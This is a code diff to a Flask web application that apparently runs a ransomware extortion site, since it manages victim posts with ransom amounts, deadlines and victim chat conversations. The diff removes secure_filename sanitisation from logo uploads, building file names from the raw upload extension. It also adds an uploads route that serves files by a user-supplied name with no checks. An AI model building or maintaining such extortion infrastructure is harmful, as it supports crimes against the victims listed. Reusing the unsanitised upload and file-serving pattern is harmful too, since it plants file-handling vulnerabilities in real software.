@@ -396,11 +396,11 @@ def generate():
             # Handle logo upload
             logo_path = None
             if logo_file and allowed_file(logo_file.filename):
-                filename = secure_filename(logo_file.filename)
-                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-                filename = f"{post_id}_{timestamp}_{filename}"
+                # Get file extension
+                ext = logo_file.filename.rsplit('.', 1)[1].lower()
+                filename = f"{post_id}.{ext}"
                 logo_file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
-                logo_path = f"uploads/{filename}"
+                logo_path = f"/uploads/{filename}"
             
             # Generate document names
             doc_gen = DocumentNameGenerator(language)
@@ -460,11 +460,11 @@ def edit(post_id):
         # Handle logo upload if provided
         logo_path = None
         if logo_file and logo_file.filename and allowed_file(logo_file.filename):
-            filename = secure_filename(logo_file.filename)
-            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-            filename = f"{post_id}_{timestamp}_{filename}"
+            # Get file extension
+            ext = logo_file.filename.rsplit('.', 1)[1].lower()
+            filename = f"{post_id}.{ext}"
             logo_file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
-            logo_path = f"uploads/{filename}"
+            logo_path = f"/uploads/{filename}"
         
         update_post(post_id, name, description, language, sector if sector else None, ransom_amount if ransom_amount else None, deadline_date if deadline_date else None, logo_path)
         flash('Post updated successfully', 'success')
@@ -746,6 +746,11 @@ def delete_chat(victim_id):
     delete_chat_messages(victim_id)
     flash('Chat conversation deleted successfully', 'success')
     return redirect(url_for('admin_chat'))
+
+@app.route('/uploads/<filename>')
+def uploaded_file(filename):
+    """Serve uploaded files"""
+    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], filename))
 
 @app.errorhandler(404)
 def not_found(error):
